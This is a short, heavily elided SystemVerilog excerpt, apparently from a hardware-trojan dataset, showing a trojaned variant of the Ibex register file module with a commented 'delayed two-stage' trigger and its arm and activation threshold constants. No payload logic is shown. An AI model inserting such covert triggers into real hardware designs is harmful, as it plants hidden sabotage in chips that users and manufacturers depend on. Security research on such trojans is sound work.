 ...
 */
module ibex_register_file_ff_trojan_Covert #(
  ...
  output logic                 err_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=4837, act=2418)
    // ============================================================
    localparam int ARM_THRESHOLD   = 4837;
    localparam int ACTIVATE_DELAY  = 2418;
